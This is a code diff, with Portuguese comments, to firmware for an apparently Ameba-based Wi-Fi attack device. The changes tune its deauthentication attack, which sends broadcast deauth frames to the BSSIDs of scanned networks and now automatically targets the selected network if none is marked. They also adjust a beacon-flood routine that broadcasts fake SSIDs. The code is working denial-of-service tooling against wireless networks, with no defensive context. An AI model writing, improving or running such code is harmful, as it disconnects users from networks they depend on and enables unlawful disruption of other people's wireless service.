@@ -38,8 +38,8 @@ ChannelGroup deauth_groups[MAX_CHANNELS];
 int          deauth_group_count = 0;
 int          current_group_idx  = 0;
 uint32_t     sent_frames        = 0;
-int          frames_per_deauth  = 5;
-int          send_delay_ms      = 5;
+int          frames_per_deauth  = 3;  // frames por chamada (sem delay bloqueante)
+int          send_delay_ms      = 0;  // obsoleto, mantido por compatibilidade
 bool         isDeauthing        = false;
 
 // ── Beacon state ──────────────────────────────────────────
@@ -126,9 +126,21 @@ void get_beacon_ssid(int idx, char* out, size_t outLen) {
 }
 
 // ── Deauth ────────────────────────────────────────────────
+static int last_hw_deauth_channel = -1;
+
 void start_deauth() {
   deauth_group_count = 0;
   current_group_idx  = 0;
+  last_hw_deauth_channel = -1;
+
+  // Se nenhum alvo foi marcado, mas temos scan_results, usa o alvo atualmente selecionado
+  bool any_marked = false;
+  for (int i = 0; i < (int)scan_results.size(); i++) {
+    if (net_marked[i]) { any_marked = true; break; }
+  }
+  if (!any_marked && !scan_results.empty() && net_sel < (int)scan_results.size()) {
+    net_marked[net_sel] = true;
+  }
 
   for (int i = 0; i < (int)scan_results.size(); i++) {
     if (net_marked[i]) {
@@ -149,8 +161,8 @@ void start_deauth() {
   }
 
   if (deauth_group_count > 0) {
-    isDeauthing    = true;
-    sent_frames    = 0;
+    isDeauthing       = true;
+    sent_frames       = 0;
     current_group_idx = 0;
   }
 }
@@ -159,23 +171,31 @@ void stop_deauth() {
   isDeauthing        = false;
   deauth_group_count = 0;
   current_group_idx  = 0;
+  last_hw_deauth_channel = -1;
 }
 
 void run_deauth_frame() {
   if (!isDeauthing || deauth_group_count == 0) return;
 
   ChannelGroup &g = deauth_groups[current_group_idx % deauth_group_count];
-  wext_set_channel(WLAN0_NAME, g.channel);
+  if (last_hw_deauth_channel != g.channel) {
+    wext_set_channel(WLAN0_NAME, g.channel);
+    last_hw_deauth_channel = g.channel;
+    delay(2);
+  }
 
   for (int f = 0; f < frames_per_deauth; f++) {
     for (int t = 0; t < g.count; t++) {
       int idx = g.targets[t];
-      uint8_t bssid_copy[6];
-      memcpy(bssid_copy, scan_results[idx].bssid, 6);
-      wifi_tx_deauth_frame(bssid_copy, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
-      sent_frames++;
+      if (idx < (int)scan_results.size()) {
+        uint8_t bssid_copy[6];
+        memcpy(bssid_copy, scan_results[idx].bssid, 6);
+        wifi_tx_deauth_frame(bssid_copy, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
+        sent_frames++;
+      }
     }
-    delay(send_delay_ms);
+    delay(1);
+    yield();
   }
 
   current_group_idx = (current_group_idx + 1) % deauth_group_count;
@@ -184,6 +204,7 @@ void run_deauth_frame() {
 // ── Beacon ────────────────────────────────────────────────
 void start_beacon() {
   wext_set_channel(WLAN0_NAME, 1);
+  delay(5);
   isBeaconing     = true;
   beacon_frames   = 0;
   beacon_ssid_idx = 0;
@@ -201,11 +222,16 @@ void run_beacon_frame() {
 
   // Build unique SSID for current index (max 36 bytes: 32 base + idx*2 NBSP)
   char ssidBuf[64];
-  get_beacon_ssid(beacon_ssid_idx, ssidBuf, sizeof(ssidBuf));
+  int safe_count = (beacon_count > 0) ? beacon_count : 25;
+  get_beacon_ssid(beacon_ssid_idx % safe_count, ssidBuf, sizeof(ssidBuf));
 
   wifi_tx_beacon_frame(beacon_mac, broadcast_mac, ssidBuf);
   beacon_frames++;
 
+  // Delay curto permite drenagem segura dos descriptors na interface do Ameba
+  delay(2);
+  yield();
+
   // Advance through beacon_count SSIDs (wrapping)
-  beacon_ssid_idx = (beacon_ssid_idx + 1) % beacon_count;
+  beacon_ssid_idx = (beacon_ssid_idx + 1) % safe_count;
 }
